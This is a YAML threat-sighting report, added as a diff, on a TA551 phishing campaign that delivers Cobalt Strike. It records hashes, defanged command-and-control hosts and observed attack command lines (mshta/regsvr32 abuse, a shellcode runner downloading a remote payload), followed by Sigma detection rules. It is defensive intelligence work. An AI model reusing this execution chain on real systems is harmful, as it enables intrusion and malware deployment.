@@ -1,0 +1,336 @@
+---
+header:
+  sightingReportId: 69012036-1131-49ea-9ffd-6f0985b7588a
+  status: wip
+  description: This Threat Sightings documents TPPs of a TA551 campaign distributing Cobalt Strike.
+  author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)
+  acknowledgement: Brad (@malware_traffic)
+  tlp: white
+  threatInformation:
+    adversaries:
+    - TA551
+    - ConfCrew
+    - Shathak
+    - GOLD CABIN
+    malware:
+    - Valak
+    - Ursnif
+    - Dridex
+    - GandCrab
+    - Vidar
+    - Predator
+    - Trickbot
+    - NetSupport Manager RAT
+    - RAT
+    - IcedID
+    - QakBot
+    - maldoc
+    - malzip
+    tools:
+    - gopurple
+    - cobaltstrike
+    lolbas:
+    - regsvr32.exe
+    - cmd.exe
+    - mshta.exe
+    - winword.exe
+threatSightings:
+  - sighting: Initial Access - Threat actor used _Email_ with _.zipped .doc file_ as attachment for Initial Access.
+    id: 36c6f707-cc5c-492b-8309-2f9add7b6e87
+    behaviors:
+    - behavior: Email with _.zipped .doc file_ as attachment.
+      id: aa592d09-3133-42f4-acba-3be3f7768404
+      type: Email Used
+      weapon: malzip
+      emails:
+        - from: n/d
+          sender: agendatercercielo@promeza[.]com # Likely Compromised E-mail Account
+          subject: "#{hijacked existing e-mail thread}"
+          attachments:
+          - name: request.zip # unzip specifics 07.21.doc
+            md5: 5542a257c140f4e76b12ea9ad668d52b # unzip 76b63751d422eb1da07e648382808e22
+      notes:
+      - Uses existing e-mail thread within compromised e-mail account (Reply Chain Attack).
+      att&ck:
+        initialAccess:
+        - "T1566.001 - Phishing: Spearphishing Attachment"
+    - behavior: _.doc_ file created.
+      type: File Created
+      weapon: maldoc
+      id: 97c18af0-e5de-48a8-a189-736983d7f2a7
+      files:
+        - name: specifics 07.21.doc
+          path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\specifics 07.21.doc
+          sha256: 0092233b718257920a6bcbd333ab13558dbddf232bf3fde8387fe331644cecc3
+      att&ck:
+        execution:
+        - "T1204.002 - User Execution: Malicious File"
+  - sighting: Initial Access - Threat actor used _weaponized .doc files_ to lure users for Execution.
+    id: 720361ea-aa98-488f-81a7-8e3c27205848
+    behaviors:
+    - behavior: _Winword_ opened _.doc_ file from Temp folder.
+      type: Process Created
+      id: 5f3b8f2a-2493-48a2-b1da-4a9ef4c99d34
+      weapon: maldoc
+      processes:
+      - cmdLine:
+        - '"C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE" /n "C:\\Users\\#{user}\\AppData\\Local\\Temp\\specifics 07.21.doc"'
+        - '"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE" /n "C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DIb46044.38871\\adjure 07.21.2021.doc" /o ""'
+        process: C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE
+      att&ck:
+        execution:
+        - "T1204.002 - User Execution: Malicious File"
+    - behavior: _Winword_ created _.HTA_ file at ProgramData folder.
+      id: 120b2efb-9325-4b70-825e-8313c9ccd3b9
+      type: File Created
+      weapon: winword
+      files:
+        - path: c:\\programdata\\brDefine.hta
+          name: brDefine.hta
+          sha256: 2950bca9339171bacadce986114925b1392290bf85701f40350e9505e5da0bfb
+          process: C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE
+        - path: C:\\ProgramData\\sds.hta
+          name: sds.hta
+          sha256: D62C9C87F14E3E762E5DA9A7D32679142DC0A5D91DDF8EB8C7A7B51B8343CF24
+          process: C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE
+      notes:
+      - during the execution of WINWORD, files were dropped.
+    - behavior: _Winword_ spawned _CMD_ to launch _.HTA_ file
+      id: 58362507-b428-4f74-a6c7-abbba8c44e33
+      type: Process Created
+      weapon: cmd
+      processes:
+      - cmdLine:
+        - 'cmd /c c:\\programdata\\brDefine.hta'
+        - 'cmd /c c:\\programdata\\sds.hta'
+        process: C:\\Windows\\System32\\cmd.exe
+        parentProcess: C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE
+      notes:
+      - two instances of the TTP are provided
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: _CMD_ spawned _MSHTA_.
+      id: c01e2bd8-a38f-4238-b7a8-a802024d6677
+      type: Process Created
+      weapon: cmd
+      processes:
+      - process: C:\\Windows\\System32\\mshta.exe
+        parentProcess: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - '"C:\\Windows\\System32\\mshta.exe" "C:\\programdata\\brDefine.hta"'
+        - '"C:\\Windows\\SysWOW64\\mshta.exe" "C:\\programdata\\sds.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}'
+      notes:
+      - mshta is responsible for the execution of the hta file
+      att&ck:
+        defenseEvasion:
+        - "T1218.005 - Signed Binary Proxy Execution: Mshta"
+  - sighting: Execution - Threat actor used _MSHTA_ to download a malicious _.DLL_ masqueraded as a _.JPG_ file for Command And Control.
+    id: 654b140c-bfb9-4c99-8588-72553cbbfb12
+    behaviors:
+    - behavior: _MSHTA_ connected to public server via HTTP.
+      id: 68c2a8a7-cc23-4367-9001-2875b0ad08f4
+      type: Network Accessed
+      weapon: mshta
+      connections:
+        - dstIp: 45[.]144.29.211
+          url: http://wilkinstransportss[.]com/bdfh/M8vW0wEDKC/13990/98945/78577/UqmtFoUgSxQJgcBW2fbvUZ2w7h9ymtYJSptD/sumej1?m4m=uGAi7rUeR3HcNJNavdx&cid=LtbWPeO8zSCYlRGIYaA4Nf&H4PX=6Qrvk6oCdF49I89tjCSo&time=h9tCXQxzNuY1C4oJM4SS7q1cYDVUb
+          dstHost: wilkinstransportss[.]com
+          protocol: tcp
+          dstPort: 80
+          userAgent: "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"
+          method: GET
+          direction: outbound
+        - dstIp: 80[.]92.206.122
+          dstHost: steptransport2017b[.]com
+          protocol: tcp
+          dstPort: 80
+          userAgent: "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; HCTE; Zoom 3.6.0)"
+          method: GET
+          direction: outbound
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Web Protocols"
+    - behavior: _MSHTA_ created _.JPG_ file at Users\\Public folder.
+      id: 26de42af-1171-40c8-b0c8-1c7808bf27d3
+      type: File Created
+      weapon: mshta
+      files:
+        - path: c:\\users\\public\\brDefine.jpg
+          name: brDefine.jpg
+          sha256: 77d0fedcee738de7b2fdd2ff73b7fb2fa296d30383f7fa7fde32907ddb9bcbab
+          process: C:\\Windows\\System32\\mshta.exe
+        - path: c:\\users\\public\\uGirl.jpg
+          name: uGirl.jpg
+          sha256: n/d
+          process: C:\\Windows\\System32\\mshta.exe
+      notes:
+      - those jpg files are DLL.
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Execution - Threat actor used _REGSVR32_ to launch payload for Defense Evasion.
+    id: d9fb140c-bfb9-4c99-8588-72553cbbfb4f
+    behaviors:
+    - behavior: MSHTA spawned REGSVR32 to execute a _.JPG_ file from Users\\Public folder.
+      id: 4bb05b0e-3f9a-4d2a-86a9-1f357e4efc4f
+      type: Process Created
+      weapon: regsvr32
+      processes:
+      - process: C:\\Windows\\System32\\regsvr32.exe
+        parentProcess: C:\\Windows\\System32\\mshta.exe
+        cmdLine:
+        - '"C:\\Windows\\System32\\regsvr32.exe" c:\\users\\public\\brDefine.jpg'
+        - '"C:\\Windows\\System32\\regsvr32.exe" c:\\users\\public\\uGirl.jpg'
+      notes:
+      - JPG files are actually DLL files.
+      att&ck:
+        defenseEvasion:
+        - "T1218.010 - Signed Binary Proxy Execution: Regsvr32"
+        - "T1036 - Masquerading"
+        - "T1218.005 - Signed Binary Proxy Execution: Mshta"
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Defense Evasion - Threat actor used _REGSVR32_ to download a masqueraded _Cobalt Strike shellcode runner_ for Command And Control.
+    id: 910da623-adb1-41a2-9179-b8499485dbd5
+    behaviors:
+    - behavior: REGSVR32 drops file (shellcode runner)
+      id: 513ab387-4494-4138-870e-4a1eb453d08d
+      type: File Created
+      weapon: regsvr32
+      files:
+        - path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\jyheeckptwa.exe
+          name: jyheeckptwa.exe
+          sha256: d1f1dc5e97c6966a99c6f254cc040c8b01a7e9314b2afcb385d696aed260e501
+          process: C:\\Windows\\System32\\regsvr32.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.010 - Signed Binary Proxy Execution: Regsvr32"
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Defense Evasion - Threat actor used _Cobalt Strike shellcode runner_ to execute a remote payload for Command And Control.
+    id: 88607e9d-e42d-4ad9-9c99-7f1e8668c617
+    behaviors:
+    - behavior: Shellcode runner connected to public server
+      type: Network Accessed
+      id: 910ac6bc-d178-45ac-b421-21aa39c5f824
+      weapon: gopurple
+      connections:
+        - dstIp: 89.163.140[.]101
+          url: http://89[].]163.140.101:8000/download/abc.bin
+          dstPort: 8000
+          protocol: tcp
+          method: GET
+          direction: outbound
+          process: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\jyheeckptwa.exe'
+      att&ck:
+        commandAndControl:
+        - "T1071 - Web Protocols"
+    - behavior: Shellcode runner executed web payload (Cobalt Strike shellcode)
+      id: 5e716824-7e45-4701-a8d0-836251093ca3
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - parentProcess: C:\\Windows\\System32\\regsvr32.exe
+        process: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\jyheeckptwa.exe'
+        cmdLine:
+        - jyheeckptwa.exe -u http://89[.]163.140.101:8000/download/abc.bin -t 1
+      notes:
+      - This shell code runner seems a variation or developed upon _Gopurple.exe_
+      - the payload is likely a CobaltStrike payload.
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+        - "T1071 - Web Protocols"
+threatHunting:
+  - query: Hunt for weaponized doc files from TA551 (SHATHAK)
+    queryId: eebcd051-3210-4613-9867-3bd8d1558b32
+    type: sigma
+    behaviorIds:
+    - 5f3b8f2a-2493-48a2-b1da-4a9ef4c99d34
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          Image|endswith:
+              - '\winword.exe'
+          CommandLine|re: '*AppData\\Local\\Temp\\Rar*\.21\.doc*'
+          CommandLine|re: '*AppData\\Local\\Temp\\Rar*\.2021\.doc*'
+      condition: selection
+  - query: Hunt for CMD instances spawned from WINWORD, where CMD launches HTA files
+    queryId: a3d71a70-625f-41ee-8a93-fcc2e5901120
+    type: sigma
+    behaviorIds:
+    - 58362507-b428-4f74-a6c7-abbba8c44e33
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|endswith: '\\Winword.exe'
+      selection2:
+          Image|endswith: '\\cmd.exe'
+      selection3:
+          CommandLine|contains|all:
+            - 'cmd /c'
+            - 'programdata'
+            - 'hta'
+      condition: all of them
+  - query: Hunt for REGSVR32 instances spawned from MSHTA
+    queryId: edbe2569-1190-4a38-b6ca-a88b40cbf560
+    type: sigma
+    behaviorIds:
+    - 4bb05b0e-3f9a-4d2a-86a9-1f357e4efc4f
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|endswith: '\\mshta.exe'
+      selection2:
+          Image|endswith:
+              - '\\regsvr32.exe'
+          CommandLine|contains|all:
+              - '.jpg'
+              - 'Users'
+              - 'Public'
+      condition: selection and selection2
+  - query: Hunt for Gopurple shellcode runner
+    queryId: adf821e3-1120-40fc-a6b5-0b89b278fd25
+    type: sigma
+    behaviorIds:
+    - 5e716824-7e45-4701-a8d0-836251093ca3
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|contains:
+            - 'AppData\\Local\\Temp'
+            - 'users\\Public'
+      selection:
+          CommandLine|contains|all:
+              - '-u http'
+              - '-t'
+      condition: selection
+footer:
+  changeTracking:
+    created: 2021-08-02
+    lastModified: 2022-03-21
+    sightingVersion: 1.11
+    schemaVersion: 1.7
+  references:
+  - https://www.malware-traffic-analysis.net/2021/07/21/index.html
+  - https://app.any.run/tasks/76a02b7a-9aea-415d-81d3-f1d4c4b89939/
+  - https://unit42.paloaltonetworks.com/valak-evolution/ (Jul 2020)
+  - https://blog.talosintelligence.com/2020/07/valak-emerges.html (Jul 2020)
+  - https://assets.sentinelone.com/labs/sentinel-one-valak-i(Jun 2020)
+  - https://labs.sentinelone.com/valak-malware-and-the-connection-to-gozi-loader-confcrew/ (Jun 2020)
+  - https://www.cybereason.com/blog/valak-more-than-meets-the-eye (May 2020)
+  - https://securityintelligence.com/posts/breaking-the-ice-a-deep-dive-into-the-icedid-banking-trojans-new-major-version-release/ (Apr 2020)
+  - https://blog.malwarebytes.com/threat-analysis/2019/12/new-version-of-icedid-trojan-uses-steganographic-payloads/ (Jan 2020)
+  - https://www.sentinelone.com/blog/ursnif-polymorphic-delivery-mechanism-explained/ (Apr 2019)
+  - https://www.carbonblack.com/blog/carbon-black-tau-threatsight-analysis-gandcrab-and-ursnif-campaign/ (Jan 2019)
+  - https://www.secureworks.com/research/threat-profiles/gold-cabin
+  - https://malware.dontneedcoffee.com/refs/actors/ta551/
